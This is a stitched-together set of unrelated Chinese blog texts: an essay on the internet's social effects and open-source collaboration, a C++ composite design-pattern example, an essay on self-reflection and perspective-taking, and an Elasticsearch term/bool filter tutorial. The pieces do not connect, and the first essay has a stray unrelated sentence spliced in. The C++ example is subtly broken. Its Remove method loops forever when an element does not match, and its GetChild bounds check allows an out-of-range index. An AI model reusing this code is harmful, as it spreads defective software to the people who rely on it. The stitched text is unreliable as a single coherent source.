然而,历史也已经证明“科学技术是一把锐利的双刃剑”。当今的这一信息化浪潮同样会给我们带来负面、消极的影响,甚至是极严重的社会问题。网络世界中不乏，消极信息，这些都对缺乏自制力的未成年人造成了不良的影像。每天都有不真实，甚至是心怀不轨的人散步谣言，网络攻击渗透随处可见。世界在发展也出现了网络发展的不均衡现象。在世界范围内建立互联网的中心指导思想就是使全世界的每—个人都能平等地使用信息资源,即“全民原则”。
但是实际情况表明,要做到这一点仅仅有技术是远远不够的,这需要世界各国在包括经济、政治、文化等各领域的通力合作。如果不能真正做到信息网络的平民化、普及化,建成后的因特网所联结的必将仅仅是一些大城市、大公司和政府机构,在线的也仅仅是那些有钱人,那么这势必加大公众获取信息的贫富差距,并且贫者愈贫,富者愈富。这种交流信息的能力的极端不平等,对“信息边远地区”、“信息贫民”的影响将是灾难性的,长此下去,他们很可能永远落后于时代。这是每一个有责任感的人都不愿意看到的。
3. 因特网给人类社会带来的哲学问题
因特网本来是为便利人们之间的沟通,但它同时带来人际关系淡化,道德、法制观念淡漠的现象。
产生这种现象的根源是人与人之间的依赖关系逐渐为人对网络的依赖关系所取代。在高度信息化、自动化的网络中,随着“家庭办公室”、“网上学校”、“电子商场”等机构的出现,人们面对面交往的机会将大为减少,甚至有的人必须终日面对终端。这很容易造成人际关系的疏远,导致个人产生紧张、孤独的情绪,对来自现实世界的刺激反应迟钝,甚至无所适从,因此也会造成个人身心的健康问题。由于目前网络技术的原因,在“网络世界”里,人们是以“符号”身份进行异步交流的,缺乏“视、听、嗅、味,触”等感觉的传播媒介,他人的热情、友善、温和、紧张、愠怒与不满,我们甚至很难比较准确地感知。也就是在网上,我们难于感受另一个活生生的人的反应,因此会以为自己面对的仅仅是机器。一个人长期如此,其本性中的弱点也很容易暴露出来而难以自制,这难免使他(她) 不妨害他人和现实社会。研究表明,有些人利用网络进行犯罪,就有这方面的原因,他们常过分相信网络的“屏蔽”作用,便以为自己无论怎样都是安全的,从而走上犯罪道路。
之后的日子里，我工作了一年，参与了公司的一些大型项目，学到了软件工程的标准开发流程，明白了流程中需要协作的智慧，完美的软件需要大家共同的努力，而不是某个人单枪匹马的横冲直撞。
4. 开源软件的协作
当今世界,以信息垄断为特征的版权制度备受非议,反对者们提出了一种Copyleft，自由创作模式, 主张作品使用的自由,强调作品集体创作的需要。Copyleft模式映射出了一种激进的创作观,这种新的视野恰恰吻合了后现代主义和后现代文学批评关于解构，作品和作者的观点。斯托尔曼在20世纪80年代发起了开放源代码运动,他认为程序员应有义务鼓励其他人分享，研究，改进和再次发布我们所开发的软件。他公开指责了在程序的使用和修改中所设置的障碍,也谴责了软件发展在传统的版权模式下作者可能获得的过度保护。他提议为软件建立一种有利于，普通公众创作繁荣和自由的不同标准。
几乎在同时,已经开发UNIX操作系统的AT&T,决定对它的操作系统取消自由使用。该决定激怒了计算机科学领域。在20世纪90年代早期,根据斯托尔曼的自由软件联盟计划,芬兰学生Linus Torvalds开发了操作系统的第一代Linux或GNU的linux版本。该系统迅速在因特网上传播开来,使世界范围内的网络使用者可以自由使用，最初大家认为这只不过是一个学生的玩笑,发展到今天,Linux已经在操作系统市场中占据了重要的份额,和系统管理者。软件开发者，因特网使用者甚至是计算机公司共同分享着巨大的成功乐趣。大量的开放源代码产品被开发出来,充实了市场,像IBM和Sun这样大型的计算机公司,赌注于将会产生软件自由发布的服务器市场,开始开发与之兼容的产品。这些就是协作智慧的最好体现。
开放源码运动——可以说,开放源代码的成功,核心不在于具体技术的成功,也不是Linux等具体产品的成功,而在于其独特的Copyleft许可模式成功。以GPL为代表的一系列许可协议决定了开放源代码社区统一的规则,激活了社区的活跃和繁荣,并且因此成就了Linux，Apache等非常优秀的软件产品,从而在软件业成功地地掀起了一场势不可挡的创新运动,动摇了任何公司都无法动摇的微软垄断地位,激活了包括软件，硬件，网络和服务等整个软件业的发展活力。
人类从诞生之日起到今天，经历了无数个协作的旅程，从埃及金字塔到我国的万里长城。软件产业的协作旅程才刚刚开始，谁能想到早起的QQ团队只有七个人，谁能想到早期的阿里巴巴团队，只有13个人，正是这些早起的协作团队创造了今天中国的软件神话。开源软件在中国才刚刚兴起，我们欣喜的看到OpenCV社区，matlab社区，csdn，中国linux社区等等论坛上，各地程序员们不懈的努力，我相信之后的中国软件产业，在上述这些大公司与人才的齐心努力下，定会蒸蒸日上，为我国经济产业奉献一份力。
我在计算机软件领域已经学习了六年，一个领域里潜心学习十年可以让一个人成为这个领域的专家。哲学是科学的科学，了解哲学的一些问题，能够在宏观上指导其他学科的学习。工作之后进入研究生阶段，更需要这样宏观上的了解。只有这样才能在之后的学习跟生活上，目标更加明确，前行更加坚定。怎样在以后的科研中，把握主要矛盾，发挥自身的主管能动性，结合前人所学用原创性的点子与构思解决科研问题，是我今后一段时间一直要思考的问题，很庆幸学习这门课程以及查找资料的过程给了我很多启示。我相信，在以后的时间里，我会进步的更快更多。








下面是组合模式的UML类图：
 

 
<span style="font-family:Microsoft YaHei;font-size:18px;"><span style="font-family:Microsoft YaHei;font-size:18px;">//composite.h

#ifndef _COMPOSITE_H_
#define _COMPOSITE_H_


#include <vector>
using namespace std;

/*
Component 抽象基类，为组合中的对象声明接口，声明了类共有接口的缺省行为
（如这里的Add，Remove,GetChild函数），声明一个接口函数可以访问Component的子组件
*/

class Component
{
public:
	//纯虚函数，只提供接口，没有默认实现
	virtual void Operation() = 0;

	// 虚函数，提供接口，有默认的实现就是什么都不做
	virtual void Add(Component* com);
	virtual void Remove(Component* com);
	virtual Component* GetChild(int index);
	virtual ~Component();

protected:
	Component();
private:
};

//Leaf是叶子节点，也就是不含有子组件的节点类，所以不用实现Add，Remove，GetChild等方法

class Leaf:public Component
{
public:
	//只实现Operation接口
	virtual void Operation();
	Leaf();
	~Leaf();

protected:
private:
};

//Composite:含有子组件的类
class Composite:public Component
{
public:
	Composite();
	~Composite();
	//实现所有接口
	void Operation();
	void Add(Component* com);
	void Remove(Component* com);
	Component* GetChild(int index);

protected:
private:
	vector<Component* >m_ComVec;
};

#endif</span></span>
 
 
<span style="font-family:Microsoft YaHei;font-size:18px;">//composite.cpp
// composite.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "composite.h"
#include <iostream>
#include <vector>
using namespace std;

Component::Component()
{}

Component::~Component()
{}

void Component::Add(Component* com)
{
	cout<<"Add"<<endl;
}

void Component::Remove(Component* com)
{

}

void Component::Operation()
{
	cout<<"Component::Operarion"<<endl;
}

Component* Component::GetChild(int index)
{
	return NULL;
}

Leaf::Leaf()
{

}

Leaf::~Leaf()
{

}

void Leaf::Operation()
{
	cout<<"Leaf::Operation"<<endl;

}

Composite::Composite()
{

}

Composite::~Composite()
{

}

void Composite::Add(Component* com)
{
	this->m_ComVec.push_back(com);
}

void Composite::Remove(Component* com)
{
	vector<Component* >::iterator iter = this->m_ComVec.begin();
	while (iter!=this->m_ComVec.end())
	{
		if (*iter == com)
		{
			iter = this->m_ComVec.erase(iter);
		}
	}
	//this->m_ComVec.erase(com);
}

void Composite::Operation()
{
	cout<<"Composite::Operation"<<endl;
	vector<Component*>::iterator iter = this->m_ComVec.begin();
	for (;iter!= this->m_ComVec.end();iter++)
	{
		(*iter)->Operation();
	}
}

Component* Composite::GetChild(int index)
{
	if (index < 0 ||index > this->m_ComVec.size())
	{
		return NULL;
	}
	return this->m_ComVec[index];
}

int _tmain(int argc, _TCHAR* argv[])
{
	 /*
      不管是叶子Leaf还是Composite对象pRoot、pCom都实现了Operation接口，所以可以一致对待，直接调用Operation()
      体现了“使得用户对单个对象和组合对象的使用具有一致性。”
    */
    Composite* pRoot = new Composite();

    //组合对象添加叶子节点
    pRoot->Add(new Leaf());

    Leaf* pLeaf1 = new Leaf();
    Leaf* pLeaf2 = new Leaf();

    //这里的叶子再添加叶子是没有意义的。
    //由于叶子与组合对象继承了相同的接口，所以语法上是对的，实际上什么也没做(继承自基类Component的Add方法)。
    //叶子节点只实现了Operation方法，其他Add、Remove、GetChild都继承自基类，没有实际意义。
    pLeaf1->Add(pLeaf2);
    pLeaf1->Remove(pLeaf2);
    //执行叶子Operation操作
    pLeaf1->Operation();

    //组合对象实现了基类Component的所有接口，所以可以做各种操作(Add、Remove、GetChild、Operation)。
    Composite* pCom = new Composite();
    //组合对象添加叶子节点
    pCom->Add(pLeaf1);
    //组合对象添加叶子节点
    pCom->Add(pLeaf2);
    //执行组合对象Operation操作
    pCom->Operation();

    //组合对象添加组合对象
   // pRoot->Add(pCom);

    //执行组合对象Operation操作
    //pRoot->Operation();

    //Component* cp = pCom->GetChild(0);
    //cp->Operation();

    //pCom->Remove(pLeaf1);

	getchar();
	return 0;
}

</span>
 
 
 
输出结果：
 

 
 
文章来源：
 
http://www.cnblogs.com/jiese/p/3168844.html









作者： 一人

我们常说当问题有了清晰的界定之后解决方案就是唯一的，理论上确实如此；但是，现实中由于种种原因，问题的界限并不明显，最终界定的问题含糊不清，造成研发人员在制定解决方案的时候具有很大的灵活性。因此，就有可能存在多个方案看上去不错。而对于不同的解决方案，对应的工作量分配方案存在十分明显的差别。
因此，我们常常在解决方案的讨论会上可以看到，来自两个不同部门的人挣的面红耳赤。其中的原因不言自明：希望自己的团队在研发过程中承担的工作量少、风险小、收益大。类似这种的利益冲突十分常见。这种以自己团队利益为出发点的思考模式，恰好是陷入了自我视点的怪圈。
不用感到怪异，大多数人的思考方式就是这种自我模式。街道上的行人为了方便将垃圾随地一扔；图书馆的“读书人”为了方便长时间的占座；某些牛人薅羊毛绝不心慈手软（如李某来）；某些企业长期的拖欠供应商的货款，甚至某些行业拖欠货款已经成了行业潜规则；某些国家为了转移国内人民的视线故意在边境引起摩擦甚至不惜发动战争；人们为了更好的生活而努力工作；企业为了更好的盈利而提高产品质量；国家为了繁荣稳定而提高法制建设。从个人到集体无不遵从个体利益至上的自我思考模式。
大多数情况下这种思考方式是好的，但如果仅用这种思考方式思考则会给自己带来无穷祸患。为了迅速的挣钱积极投身“发币”行业，结果被割韭菜12；钉子户只为给自己的面临拆迁的房子“讨”个好价钱，结果被暴力强拆甚至出现死伤；美资企业在刚进入中国的时候，只要用户投诉商品质量有问题，都会立刻补发一个，并且不用将有问题商品退还，部分人“聪明”人士就谎报商品问题，从中赚取收益，最终导致企业取消这一“福利”；亚马逊的书本七天内无理由退换货，结果有些聪明的同学在七天之内将书看完又退掉（当然大度的美林阁门也没有改变退货政策:)）；公司为了方便员工工作，购置零食放在办公室，配置高级电脑，而有的人周末将同学带到单位打游戏，被老板发现之后遭开除；学校为了照顾学生对学生宿舍收取低额费用，而有的同学专门将宿舍中空余床铺转租给社会人士赚取差价，结果被学校通报批评甚至开除学籍。
类似的过于“自我”的行为已经屡见不鲜。
在这里我将要向大家介绍一种方法来尽可能避免这种情况:用“鹰眼”视角看问题。当面对问题的时候，它要求我们跳出自身局限，从更高层次看待问题。在考虑问题的时候，除过自己和自己所面临的问题以外，再加入其它利益相关方，综合实现对自己的一种“俯视”。
这个方法有三个步骤：
    1. 自我审视。
    2. 换位思考。
    3. 倾听他人意见。

 自我审视
“鹰眼”看问题的第一步就是自我审视，经常问自己：为什么我刚才会做出那样的决断。
我们遇到的问题通常都直接关乎自己的利益得失，例如岗位的晋升关乎到薪水的多少；公众场合演讲的成败关乎到名声好坏等等。每个人面对类似机会都期望得到提升，无论提升值的大小，更好的薪水或名声等。
因此，这种期望心理难免会影响到我们的判断
与此同时，每一次决断也都受到自己固有观念的影响。《思考的快与慢》告诉我们，人有两个大脑，一个反射脑，一个思考脑，多数的思考都是经过反射脑，反射脑是由历史行为训练而成。这种决断方式我们叫做“固有观念”，而问题所在的真实场景才是决断的最好依据，
因此，固有观念也会影响我们难以保持客观理性
如果说“思考岗位晋升”关于到自己的利益得失，那么思考为什么刚才那么想，就不会关乎任何利益，可以促进自己的公平客观。如果说思考直接事物会受到反射脑的影响，那么这种反问，没有任何历史可供参考，反射脑对这种方式也就无法处理，只能使用思考脑来做决断。
孔子曰：吾日三省吾身。经常的自我审视，还有其他好处。
它可以增加思考深度
当我们学习某个知识的时候，第一次通常只是注意如何做，很久之后再学习的时候才会注意到为什么要这么做；甚至很久之后才会体会到这么做的其他好处。知识的学习需要经历反复学习的过程，而这种自我审视，恰好能够加速这一过程。
自我审视为自己创造了更真实完整的参考资料
我们大多数人都是通过书本，其他人身上学习，但是他们之所以优秀，除过他们口里说出来的，用笔写出来的，其实还有很多，而这些因素我们学习者往往无法知道，因此这些学习案例就会存在着偏差。而自我审视的材料是我们自己的事情，相关因素我们一清二楚，也就构成了一种真实完整的学习案例。
自我审视也是代价最小的学习方式
自我审视可以在汽车上，也可以在走路的过程中，它无需你单独腾出时间来进行，而现代人最宝贵的东西就是时间，因此，这种自我审视性价比极高。
人是有社会性的，而且又是这个高度分工的社会，任何人都无法孤立存在，必然要与他人产生交互。因此，要想尽力避免过于“自我”除过自我审视，还需要我们多尝试从他人角度看问题。

 换位思考
“鹰眼”看问题的第二步：换位思考。
心理学当中研究发现人们具有归因偏差3。
“观察者本人对自己行为动机的归因不同与他人对自己行为的归因。虽然双方认知到的是同一行为，但行为者往往把自己失败的行为归因于情景，而他人则可能归因于行为者的个人倾向……人们倾向于把积极的结果归因于自己，……把消极的结果归因于情境”。由于这种因素的存在使得，当我们失败的时候，放大了周围环境的作用，而别人又缩小甚至忽略了环境的作用；当获得成功的时候，往往又会放大自己的作用，缩小甚至忽略环境的作用。
因此，这些心理现象表明我们往往会偏离客观事实，对客观公正的决断造成负面影响。
而换位思考使得我们既可以从自我视角看问题，又可以从旁观者视角看问题，当二者发生冲突的时候，就能够促进我们进行公正决断
另一方面，个人目标的实现需要和其他各方协同努力，与人沟通和协作就不可避免。如果只是关注自己利益相关的点，就会失去双方沟通的基础，双方协作就难以进行或者效率十分低下。
而换位思考，恰好就能够建设一座沟通的桥梁，互相理解，可以避免对牛弹琴，驴唇对马嘴的现象出现
人们常说认知有四个区域：
- 知道自己知道
- 知道自己不知道
- 不知道自己知道
- 不知道自己不知道

如果仅仅关注自己利益相关的地方，就永远使自己徘徊在“知道自己知道”的范围内。而事物的失败往往就是由自己不知道的因素造成的。通过换位思考，我们就可以拓宽自己的视野，加大自己的认知区间，将更多的“不知道”变成“知道”，减少失败的因素，增加成功的几率。因此，换位思考应当引起我们的重视。
以上都只建立在我们个体身上，在思考的过程中，加入其它人员会有更大的效用。

倾听他人意见
当今社会面对浩如烟海的知识，我们每个人都只能选择专精一块，万万无法实现全部精通，矛盾的是，我们每个人并不能将自己的生活局限在自己熟知的范围内而不与其他方面产生联系，当面临自己不熟知的领域时，要想尽可能的做出正确的决策，借助他人智慧就必不可少。其他人的智慧又可以根据是否存在利益关系分为两类：其他利益相关的人员和独立第三方。
如果你与他人是一种相互协作的关系，那么就要多听取利益相关的其他人员的意见
由于自身利益的驱使，我们每个人都对自己利益相关的地方格外的关注，对自己利益相关点的了解程度也就要高于其他人，而你们有着相关协作的关系，他所熟知的领域必然和你熟知的领域十分接近，因此，他们对于你的境况也是最了解的，在此基础上给出具有建设性的意见也就是情理之中的事情；另一方面对于有协作关系的他人，你们之间有相同的利益关系，这样可以保证他人必然朝着利益最大化的方向决策和建议。因此，在这种情况下多听取他们的意见。
如果与他人是一种相互竞争的关系，要多参考独立第三方的意见
如果这种竞争是零和博弈4，那么不容置疑利益相关方给出的意见必定存在歹意；如果这种竞争是非零和博弈5，虽然我们找不到歹意存在的证据，但是我们也无法找到好意存在的理由，那么不可避免会持怀疑的态度。而对于独立第三方，我们可以肯定不会存在利益纠葛，就排除了偏见存在的最重要因素。如果我们对于给予我们意见的人士以酬劳，那么就有很大的几率获得公正的意见。但是在这里一定强调：由于不存在相关利益，很多第三方对于问题背景的理解并不专业和透彻，因此并不是所有独立第三方的意见都值得珍惜。
如果既存在竞争又存在合作的关系，要以合作为主，竞争为辅，有时候出让一点自己的利益也十分必要
人们之间存在竞争或者合作，二者平衡的好与坏只是涉及到利益的多与少；而如果合作破裂，就会使双方的收益瞬间为零，这种情况是所有人都不愿面对的，因此，保持合作的进行是首要目标。另一个方面，我们并不能保证参与各方对利益的认知始终保持一致，很多时候，或多或少都会存在偏差，因此对于利益的平衡点就往往存在争论。而且，我们并不认为所有人始终保持理智的状态，提出超出利益平衡的要求也会时常存在，如果过于纠结损失的多少就有可能致使合作破裂，因此，有的时候出让一些自己的利益必不可少。
使用“鹰眼视角”看问题，理性全面的思考。
“纸上得来终觉浅，绝知此事要躬行”，行动起来吧！
全景网，“虚拟货币”集资诈骗案！3000多人被骗3亿元,”区块链+普洱”割韭菜只需4步，2018-05-16 ↩新浪，“区块链”传销骗局正猖狂 传销币骗局不断上演，2018-04-25 ↩baike，归因偏向，2014-01-03 ↩baike，零和博弈，2009-11-16 ↩baike，非零和博弈，2017-01-20 ↩ 









Part II    深入搜索
搜索不仅仅是全文本搜索：数据的很大部分是结构化的值例如日期、数字。这部分开始解释怎样以一种高效地方式结合结构化搜索和全文本搜索。
第十二章 结构化搜索

结构化搜索_ 是指查询包含内部结构的数据。日期，时间，和数字都是结构化的：它们有明确的格式给你执行逻辑操作。一般包括比较数字或日期的范围，或确定两个值哪个大。
文本也可以被结构化。一包蜡笔有不同的颜色：红色，绿色，蓝色。一篇博客可能被打上 分布式 和 搜索的标签。电子商务产品有商品统一代码（UPCs） 或其他有着严格格式的标识。

通过结构化搜索，你的查询结果始终是 是或非；是否应该属于集合。结构化搜索不关心文档的相关性或分数，它只是简单的包含或排除文档。
这必须是有意义的逻辑，一个数字不能比同一个范围中的其他数字更多。它只能包含在一个范围中 —— 或不在其中。类似的，对于结构化文本，一个值必须相等或不等。这里没有 更匹配 的概念。
12.1 查找准确值
对于准确值，你需要使用过滤器。过滤器的重要性在于它们非常的快。它们不计算相关性（避过所有计分阶段）而且很容易被缓存。我们今后再来讨论过滤器的性能优势【过滤器缓存】，现在，请先记住尽可能多的使用过滤器。
用于数字的 term 过滤器
介绍 term 过滤器，经常会用到它，这个过滤器旨在处理数字，布尔值，日期，和文本。
看一下例子，一些产品最初用数字来索引，包含两个字段 price 和 productID：
POST /my_store/products/_bulk
{ "index": { "_id": 1 }}
{ "price" : 10, "productID" : "XHDK-A-1293-#fJ3" }
{ "index": { "_id": 2 }}
{ "price" : 20, "productID" : "KDKE-B-9947-#kL5" }
{ "index": { "_id": 3 }}
{ "price" : 30, "productID" : "JODL-X-1937-#pV7" }
{ "index": { "_id": 4 }} 
{ "price" : 30, "productID" : "QQPX-R-3956-#aD8" }

目标是找出特定价格的产品。如果有关系型数据库背景，可能用 SQL 来表现这次查询比较熟悉，它看起来像这样：
    SELECT document
    FROM   products
    WHERE  price = 20
在 Elasticsearch DSL 中，使用 term 过滤器来实现同样的事。term 过滤器会查找设定的准确值。term 过滤器本身很简单，它接受一个字段名和我们希望查找的值：
{
    "term" : {
        "price" : 20
    }
}

term 过滤器本身并不能起作用。像在【查询 DSL】中介绍的一样，搜索 API 需要得到一个查询语句，而不是一个 过滤器。为了使用 term 过滤器，我们需要将它包含在一个过滤查询语句中：
GET /my_store/products/_search
{
    "query" : {
        "filtered" : { <1>
            "query" : {
                "match_all" : {} <2>
            },
            "filter" : {
                "term" : { <3>
                    "price" : 20
                }
            }
        }
    }
}

<1> filtered 查询同时接受接受 query 与 filter。 
<2> match_all 用来匹配所有文档，这是默认行为，所以在以后的例子中将省略掉 query 部分。 
<3> 这是上面见过的 term 过滤器。注意它在 filter 分句中的位置。
执行之后，你将得到预期的搜索结果：只能文档 2 被返回了（因为只有 2 的价格是 20）：
"hits" : [
    {
        "_index" : "my_store",
        "_type" :  "products",
        "_id" :    "2",
        "_score" : 1.0, <1>
        "_source" : {
          "price" :     20,
          "productID" : "KDKE-B-9947-#kL5"
        }
    }
]

<1> 过滤器不会执行计分和计算相关性。分值由 match_all 查询产生，所有文档一视同仁，所有每个结果的分值都是 1
用于文本的 term 过滤器
像我们在开头提到的，term 过滤器可以像匹配数字一样轻松的匹配字符串。让我们通过特定 UPC 标识码来找出产品，而不是通过价格。如果用 SQL 来实现，我们可能会使用下面的查询：
sql
SELECT product
FROM   products
WHERE  productID = "XHDK-A-1293-#fJ3"

转到查询 DSL，我们用 term 过滤器来构造一个类似的查询：
GET /my_store/products/_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "term" : {
                    "productID" : "XHDK-A-1293-#fJ3"
                }
            }
        }
    }
}

有点出乎意料：没有得到任何结果值！为什么呢？问题不在于 term 查询；而在于数据被索引的方式。如果我们使用 analyze API，我们可以看到 UPC 被分解成短小的表征：
curl -XGET '10.10.10.114:9200/my_store_weichao/_analyze?field=productID&pretty' -d'XHDK-A-1293-#fJ3'


{
  "tokens" : [ {
    "token" :        "xhdk",
    "start_offset" : 0,
    "end_offset" :   4,
    "type" :         "<ALPHANUM>",
    "position" :     1
  }, {
    "token" :        "a",
    "start_offset" : 5,
    "end_offset" :   6,
    "type" :         "<ALPHANUM>",
    "position" :     2
  }, {
    "token" :        "1293",
    "start_offset" : 7,
    "end_offset" :   11,
    "type" :         "<NUM>",
    "position" :     3
  }, {
    "token" :        "fj3",
    "start_offset" : 13,
    "end_offset" :   16,
    "type" :         "<ALPHANUM>",
    "position" :     4
  } ]
}

这里有一些需要注意到的要点：

我们得到了四个分开的标记，而不是一个完整的标记来表示UPC。
所有的字符都被转为了小写。
我们失去了连字符和 # 符号。

所以当用 XHDK-A-1293-#fJ3 来查找时，得不到任何结果，因为这个标记不在我们的倒排索引中。相反，那里有上面列出的四个标记。
显然，在处理唯一标识码，或其他枚举值时，这不是我们想要的结果。
为了避免这种情况发生，需要通过设置这个字段为 not_analyzed 来告诉 Elasticsearch 它包含一个准确值。曾在【自定义字段映射】中见过它。为了实现目标，要先删除旧索引（因为它包含了错误的映射），并创建一个正确映射的索引：
DELETE /my_store  <1>


PUT /my_store     <2>
{
    "mappings" : {
        "products" : {
            "properties" : {
                "productID" : {
                    "type" : "string",
                    "index" : "not_analyzed" <3>
                }
            }
        }
    }
}

<1> 必须首先删除索引，因为我们不能修改已经存在的映射。
<2> 删除后，我们可以用自定义的映射来创建它。
<3> 这里我们明确表示不希望 productID 被分析。
现在我们可以继续重新索引文档：
POST /my_store/products/_bulk  
{ "index": { "_id": 1 }}
{ "price" : 10, "productID" : "XHDK-A-1293-#fJ3" }
{ "index": { "_id": 2 }}
{ "price" : 20, "productID" : "KDKE-B-9947-#kL5" }
{ "index": { "_id": 3 }}
{ "price" : 30, "productID" : "JODL-X-1937-#pV7" }
{ "index": { "_id": 4 }}
{ "price" : 30, "productID" : "QQPX-R-3956-#aD8" }

现在我们的 term 过滤器将按预期工作。让我们在新索引的数据上再试一次（注意，查询和过滤都没有修改，只是数据被重新映射了）。
GET /my_store/products/_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "term" : {
                    "productID" : "XHDK-A-1293-#fJ3"
                }
            }
        }
    }
}

productID 字段没有经过分析，term 过滤器也没有执行分析，所以这条查询找到了准确匹配的值，如期返回了文档 1。
内部过滤操作
Elasticsearch 在内部会通过一些操作来执行一次过滤：

查找匹配文档。
term 过滤器在倒排索引中查找词 XHDK-A-1293-#fJ3，然后返回包含那个词的文档列表。在这个例子中，只有文档 1 有我们想要的词。
创建字节集
然后过滤器将创建一个 字节集 —— 一个由 1 和 0 组成的数组 —— 描述哪些文档包含这个词。匹配的文档得到 1 字节，在我们的例子中，字节集将是 [1,0,0,0]
缓存字节集
最后，字节集被储存在内存中，以使我们能用它来跳过步骤 1 和 2。这大大的提升了性能，让过滤变得非常的快。
增加使用次数累积
Elasticsearch能够缓存non-scoring查询，从而让查询访问更快，然而它也会将很少再用的查询缓存起来。因此我们想缓存那些未来会再次用到的查询从而来减少资源的浪费。 

当执行 filtered 查询时，filter 会比 query 早执行。结果字节集会被传给 query 来跳过已经被排除的文档。这种过滤器提升性能的方式，查询更少的文档意味着更快的速度。
组合过滤
前面的两个例子展示了单个过滤器的使用。现实中，你可能需要过滤多个值或字段，例如，想在 Elasticsearch 中表达这句 SQL
SELECT product
FROM   products
WHERE  (price = 20 OR productID = "XHDK-A-1293-#fJ3")
  AND  (price != 30)

这些情况下，需要 bool 过滤器。这是以其他过滤器作为参数的组合过滤器，将它们结合成多种布尔组合。
布尔过滤器
bool 过滤器由三部分组成：
{
   "bool" : {
      "must" :     [],
      "should" :   [],
      "must_not" : [],
   }
}

must：所有分句都必须匹配，与 AND 相同。
must_not：所有分句都必须不匹配，与 NOT 相同。
should：至少有一个分句匹配，与 OR 相同。
这样就行了！如果你需要多个过滤器，将他们放入 bool 过滤器就行。
提示： 
bool 过滤器的每个部分都是可选的（例如，你可以只保留一个 must 分句），而且每个部分可以包含一到多个过滤器
为了复制上面的 SQL 示例，我们将两个 term 过滤器放在 bool 过滤器的 should 分句下，然后用另一个分句来处理 NOT 条件：
GET /my_store/products/_search
{
   "query" : {
      "filtered" : {                         <1>
         "filter" : {
            "bool" : {
              "should" : [
                 { "term" : {"price" : 20}}, <2>
                 { "term" : {"productID" : "XHDK-A-1293-#fJ3"}} <2>
              ],
              "must_not" : {
                 "term" : {"price" : 30}     <3>
              }
           }
         }
      }
   }
}

<1> 注意我们仍然需要用 filtered 查询来包裹所有条件。
<2> 这两个 term 过滤器是 bool 过滤器的子节点，因为它们被放在 should 分句下，所以至少他们要有一个条件符合。
<3> 如果一个产品价值 30，它就会被自动排除掉，因为它匹配了 must_not 分句。
我们的搜索结果返回了两个结果，分别满足了 bool 过滤器中的不同分句：
"hits" : [
    {
        "_id" :     "1",
        "_score" :  1.0,
        "_source" : {
          "price" :     10,
          "productID" : "XHDK-A-1293-#fJ3" <1>
        }
    },
    {
        "_id" :     "2",
        "_score" :  1.0,
        "_source" : {
          "price" :     20, <2>
          "productID" : "KDKE-B-9947-#kL5"
        }
    }
]

<1> 匹配 term 过滤器 productID = "XHDK-A-1293-#fJ3"
<2> 匹配 term 过滤器 price = 20
嵌套布尔过滤器
虽然 bool 是一个组合过滤器而且接受子过滤器，需明白它自己仍然只是一个过滤器。这意味着你可以在 bool 过滤器中嵌套 bool 过滤器，实现更复杂的布尔逻辑。
下面先给出 SQL 语句：
SELECT document
FROM   products
WHERE  productID = "KDKE-B-9947-#kL5"
  OR (     productID = "JODL-X-1937-#pV7"
       AND price     = 30 )

可以将它翻译成一对嵌套的 bool 过滤器：
GET /my_store/products/_search
{
   "query" : {
      "constant_score" : {
         "filter" : {
            "bool" : {
              "should" : [
                { "term" : {"productID" : "KDKE-B-9947-#kL5"}}, <1>
                { "bool" : { <1>
                  "must" : [
                    { "term" : {"productID" : "JODL-X-1937-#pV7"}}, <2>
                    { "term" : {"price" : 30}} <2>
                  ]
                }}
              ]
           }
         }
      }
   }
}

<1> 因为term和bool在should中的bool过滤器中，因此至少term和bool其中一个查询必须被匹配。
<2> 这两个term过滤器在bool查询的must中匹配嵌套，因此必须全部匹配。
结果得到两个文档，分别匹配一个 should 分句：
  "hits" : {
    "total" : 2,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "my_store_weichao",
      "_type" : "products",
      "_id" : "2",
      "_score" : 1.0,
      "_source" : {
        "price" : 20,
        "productID" : "KDKE-B-9947-#kL5"
      }
    }, {
      "_index" : "my_store_weichao",
      "_type" : "products",
      "_id" : "3",
      "_score" : 1.0,
      "_source" : {
        "price" : 30,
        "productID" : "JODL-X-1937-#pV7"
      }
    } ]

这只是一个简单的例子，但是它展示了该怎样用布尔过滤器来构造复杂的逻辑条件。
查询多个准确值
term 过滤器在查询单个值时很好用，但是你可能经常需要搜索多个值。比如你想寻找 20 或 30 元产品的文档，该怎么做呢？
比起使用多个 term 过滤器，你可以用一个 terms 过滤器。terms 过滤器是 term 过滤器的复数版本。
它用起来和 term 差不多，我们现在来指定一组数值，而不是单一价格：
{
    "terms" : {
        "price" : [20, 30]
    }
}

像 term 过滤器一样，我们将它放在 filtered 查询中：
GET /my_store/products/_search
{
    "query" : {
        "constant_score" : {
            "filter" : {
                "terms" : {
                    "price" : [20, 30]
                }
            }
        }
    }
}

<1> 这是前面提到的 terms 过滤器，放置在 包含在constant_score的filtered 查询中这条查询将返回第二，第三和第四个文档：
包含，而不是相等
理解 term 和 terms 是包含操作，而不是相等操作，这点非常重要。
假如你有一个 term 过滤器 { "term" : { "tags" : "search" } }，它将匹配下面两个文档：
{ "tags" : ["search"] }
{ "tags" : ["search", "open_source"] }        <1>

<1> 虽然这个文档除了 search 还有其他短语，它还是被返回了
回顾一下 term 过滤器是怎么工作的：它检查倒排索引中所有具有短语的文档，然后组成一个字节集。在我们简单的示例中，我们有下面的倒排索引：



Token
DocIDs



open_source
2


search
1,2


当执行 term 过滤器来查询 search 时，它直接在倒排索引中匹配值并找出相关的 ID。如你所见，文档 1 和文档 2 都包含 search，所以他们都作为结果集返回。
提示： 
  倒排索引的特性让完全匹配一个字段变得非常困难。你将如何确定一个文档只能包含你请求的短语？你将在索引中找出这个短语，解出所有相关文档 ID，然后扫描 索引中每一行来确定文档是否包含其他值。
由此可见，这将变得非常低效和开销巨大。因此，term 和 terms 是 必须包含 操作，而不是 必须相等。
完全匹配
假如你真的需要完全匹配这种行为，最好是通过添加另一个字段来实现。在这个字段中，你索引原字段包含值的个数。引用上面的两个文档，我们现在包含一个字段来记录标签的个数：
{ "tags" : ["search"], "tag_count" : 1 }
{ "tags" : ["search", "open_source"], "tag_count" : 2 }

一旦你索引了标签个数，你可以构造一个 bool 过滤器来限制短语个数：
GET /my_index/my_type/_search
{
    "query": {
        "constant_score" : {
            "filter" : {
                 "bool" : {
                    "must" : [
                        { "term" : { "tags" : "search" } }, <1>
                        { "term" : { "tag_count" : 1 } } <2>
                    ]
                }
            }
        }
    }
}

<1> 找出所有包含 search 短语的文档
<2> 但是确保文档只有一个标签
